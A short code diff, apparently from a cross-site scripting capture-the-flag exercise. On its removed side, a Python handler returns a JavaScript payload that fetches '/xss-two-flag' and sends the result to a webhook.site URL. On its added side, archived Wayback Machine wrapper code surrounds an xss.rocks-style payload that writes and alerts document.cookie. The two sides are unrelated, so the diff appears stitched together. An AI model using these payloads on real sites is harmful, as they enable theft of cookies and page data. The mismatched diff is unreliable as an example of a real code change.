@@ -1,20 +1,16 @@
-  def serveIt(request):
-    request_json = request.get_json(silent=True)
-    request_args = request.args
+var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
+if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
+{
+  let window = _____WB$wombat$assign$function_____("window");
+  let self = _____WB$wombat$assign$function_____("self");
+  let document = _____WB$wombat$assign$function_____("document");
+  let location = _____WB$wombat$assign$function_____("location");
+  let top = _____WB$wombat$assign$function_____("top");
+  let parent = _____WB$wombat$assign$function_____("parent");
+  let frames = _____WB$wombat$assign$function_____("frames");
+  let opener = _____WB$wombat$assign$function_____("opener");
 
-    if request_json and 'name' in request_json:
-        name = request_json['name']
-    elif request_args and 'name' in request_args:
-        name = request_args['name']
-    else:
-        name = 'World'
 
-    return """  
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET',location.origin + '/xss-two-flag',true);
-            xhr.onload = function () {
-                var request = new XMLHttpRequest();
-                request.open('GET','https://webhook.site/bafc1658-940e-417a-a1bb-638c72e05b06?data=' + xhr.responseText,true);
-                request.send()};
-            xhr.send(null);
-    """
+document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
+}
